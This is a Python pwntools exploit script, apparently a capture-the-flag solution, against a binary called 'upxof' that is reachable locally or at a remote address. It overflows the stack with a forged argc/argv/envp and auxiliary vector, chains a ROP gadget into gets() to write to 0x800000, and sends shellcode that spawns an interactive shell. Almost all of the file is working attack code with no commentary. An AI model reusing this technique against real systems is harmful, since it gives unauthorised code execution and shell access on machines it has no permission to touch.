#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *   # pip install pwntools
context.arch = "amd64"
context.terminal = ['tmux', 'new-window']

if "remote" in sys.argv:
    r = remote("192.168.201.9", 23333)
else:
    r = process("./upxof")

r.recvuntil("password:")

# gdb.attach(r.pid)

payload = "12345678"
payload += p64(0) * 14
payload += p64(1) # argc
payload += p64(0x400008) # argv
payload += p64(0)
payload += p64(0x400008) * 39 # envp
payload += p64(0)
# aux vector 
#payload += p64(0x21)
#payload += p64(0x7ffff7ffd000)
#payload += p64(0x10)   # AT_HWCAP
#payload += p64(0x1f8bfbff)
#payload += p64(0x6)    # AT_PAGESZ
#payload += p64(0x1000)
#payload += p64(0x11)   # AT_CLKTCK
#payload += p64(0x64)
payload += p64(0x3)     # AT_PHDR
payload += p64(0x400040)
#payload += p64(0x4)    # AT_PHENT
#payload += p64(0x38)
payload += p64(0x5)     # AT_PHNUM
payload += p64(0x2)
#payload += p64(0x7)    # AT_BASE
#payload += p64(0x0)
#payload += p64(0x8)    # AT_FLAGS
#payload += p64(0x0)
payload += p64(0x9)     # AT_ENTRY
payload += p64(0x400988)
#payload += p64(0xb)    # AT_UID
#payload += p64(0x0)
#payload += p64(0xc)    # AT_EUID
#payload += p64(0x0)
#payload += p64(0xd)    # AT_GID
#payload += p64(0x0)
#payload += p64(0xe)    # AT_EGID
#payload += p64(0x0)
#payload += p64(0x17)   # AT_SECURE
#payload += p64(0x0)
payload += p64(0x19)    # AT_RANDOM
payload += p64(0x800008)
#payload += p64(0x1f)   # AT_EXECFN
#payload += p64(0x7fffffffeff0)#--> 0x666f7870752f2e ('./upxof')
#payload += p64(0xf)    # AT_PLATFORM
#payload += p64(0x7fffffffe659)# --> 0x34365f363878 ('x86_64')

payload += p64(0)
payload += p64(0)
r.sendline(payload)

r.recvuntil(":")

pop_rdi = 0x4007f3
gets = 0x4005B0

r.sendline(flat("\x00" * 1048, pop_rdi, 0x00800000, gets, 0x00800000))

r.sendline(asm(shellcraft.sh()))

r.interactive()


